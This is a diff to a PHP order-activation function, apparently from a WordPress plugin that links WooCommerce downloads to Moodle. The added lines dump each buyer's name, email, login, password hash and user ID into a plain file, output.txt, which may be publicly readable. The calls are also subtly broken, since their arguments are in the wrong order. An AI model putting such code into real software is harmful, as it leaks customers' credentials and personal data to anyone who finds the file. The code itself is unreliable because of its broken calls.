@@ -5,13 +5,20 @@ function auto_activate( $order_id ) {
 	$downloads = $order->get_downloadable_items();
 	$user_id = $order->get_user_id();
 	$user = get_user_by('id', $user_id);
+    $filename = 'output.txt';
+	file_put_contents($filename, FILE_APPEND, $user->user_firstname);
+	file_put_contents($filename, FILE_APPEND, $user->user_lastname);
+	file_put_contents($filename, FILE_APPEND, $user->user_email);
+	file_put_contents($filename, FILE_APPEND, $user->user_login);
+	file_put_contents($filename, FILE_APPEND, $user->user_pass);
+	file_put_contents($filename, FILE_APPEND, $user->ID);
 	foreach ($downloads as $download) {
-		$activate_url = get_wp2moodle_activate_url($download["download_url"], $user_id);
+		$activate_url = get_wp2moodle_activate_url($download["download_url"], $user);
 		file_get_contents($activate_url);
 	}
 }
 
-function get_wp2moodle_activate_url($url, $user_id) {
+function get_wp2moodle_activate_url($url, $user) {
 
 	if (strpos($url, 'wp2moodle.txt') !== false) {
 		$path = $_SERVER['DOCUMENT_ROOT'] . parse_url($url)["path"];
